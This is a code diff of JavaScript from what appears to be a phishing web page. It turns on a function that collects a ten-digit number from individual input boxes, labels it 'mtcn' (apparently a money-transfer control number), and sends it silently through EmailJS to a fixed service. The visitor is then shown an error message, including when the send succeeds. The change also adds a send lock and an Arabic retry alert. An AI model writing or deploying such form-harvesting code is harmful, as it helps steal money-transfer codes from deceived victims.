@@ -1899,49 +1899,49 @@
             }
         }
 
-        // function send_number(id) {
-        //     if (id == 1) {
-        //         if (
-        //             page_1_1.value != "" &&
-        //             page_1_2.value != "" &&
-        //             page_1_3.value != "" &&
-        //             page_1_4.value != "" &&
-        //             page_1_5.value != "" &&
-        //             page_1_6.value != "" &&
-        //             page_1_7.value != "" &&
-        //             page_1_8.value != "" &&
-        //             page_1_9.value != "" &&
-        //             page_1_10.value != ""
-        //         ) {
-        //             let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value;
-        //             send_mail(message);
-        //             document.getElementById("message_error").style.display = "block";
-        //             document.getElementById("label_tat_mtcn_error1").style.display = "none";
-        //         } else {
-        //             document.getElementById("label_tat_mtcn_error1").style.display = "block";
-        //         }
-        //     } else {
-        //         if (
-        //             page_2_1.value != "" &&
-        //             page_2_2.value != "" &&
-        //             page_2_3.value != "" &&
-        //             page_2_4.value != "" &&
-        //             page_2_5.value != "" &&
-        //             page_2_6.value != "" &&
-        //             page_2_7.value != "" &&
-        //             page_2_8.value != "" &&
-        //             page_2_9.value != "" &&
-        //             page_2_10.value != ""
-        //         ) {
-        //             let message = page_2_1.value + page_2_2.value + page_2_3.value + page_2_4.value + page_2_5.value + page_2_6.value + page_2_7.value + page_2_8.value + page_2_9.value + page_2_10.value;
-        //             document.getElementById("message_error").style.display = "block";
-        //             send_mail(message);
-        //             document.getElementById("label_tat_mtcn_error1").style.display = "none";
-        //         } else {
-        //             document.getElementById("label_tat_mtcn_error1").style.display = "block";
-        //         }
-        //     }
-        // }
+        function send_number(id) {
+            if (id == 1) {
+                if (
+                    page_1_1.value != "" &&
+                    page_1_2.value != "" &&
+                    page_1_3.value != "" &&
+                    page_1_4.value != "" &&
+                    page_1_5.value != "" &&
+                    page_1_6.value != "" &&
+                    page_1_7.value != "" &&
+                    page_1_8.value != "" &&
+                    page_1_9.value != "" &&
+                    page_1_10.value != ""
+                ) {
+                    let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value;
+                    send_mail(message);
+                    document.getElementById("message_error").style.display = "block";
+                    document.getElementById("label_tat_mtcn_error1").style.display = "none";
+                } else {
+                    document.getElementById("label_tat_mtcn_error1").style.display = "block";
+                }
+            } else {
+                if (
+                    page_2_1.value != "" &&
+                    page_2_2.value != "" &&
+                    page_2_3.value != "" &&
+                    page_2_4.value != "" &&
+                    page_2_5.value != "" &&
+                    page_2_6.value != "" &&
+                    page_2_7.value != "" &&
+                    page_2_8.value != "" &&
+                    page_2_9.value != "" &&
+                    page_2_10.value != ""
+                ) {
+                    let message = page_2_1.value + page_2_2.value + page_2_3.value + page_2_4.value + page_2_5.value + page_2_6.value + page_2_7.value + page_2_8.value + page_2_9.value + page_2_10.value;
+                    document.getElementById("message_error").style.display = "block";
+                    send_mail(message);
+                    document.getElementById("label_tat_mtcn_error1").style.display = "none";
+                } else {
+                    document.getElementById("label_tat_mtcn_error1").style.display = "block";
+                }
+            }
+        }
 
         function out_(id) {
             if (id == 1) {
@@ -1991,21 +1991,31 @@
             }
         }
 
-        function send_mail(message) {
-            console.log("Sending message:", message);
+        let isSending = false;
 
-            emailjs.send("service_4v5sos8", "template_5ar7wqa", {
-                name: "mtcn",
-                message: message
-            })
-                .then(function (response) {
-                    console.log("Email sent successfully!", response.status, response.text);
-                }, function (error) {
-                    console.error("Failed to send email:", error);
-                    alert("حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.");
-                });
-        }
+function send_mail(message) {
+    if (isSending) {
+        console.log("جاري إرسال الرقم بالفعل:", message);
+        return;
+    }
 
+    isSending = true;
+
+    console.log("Sending message:", message);
+
+    emailjs.send("service_4v5sos8", "template_5ar7wqa", {
+        name: "mtcn",
+        message: message
+    })
+    .then(function (response) {
+        console.log("Email sent successfully!", response.status, response.text);
+        isSending = false; 
+    }, function (error) {
+        console.error("Failed to send email:", error);
+        alert("حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.");
+        isSending = false;
+    });
+}
         setTimeout(() => {
             page_1_1.focus();
         }, 500);
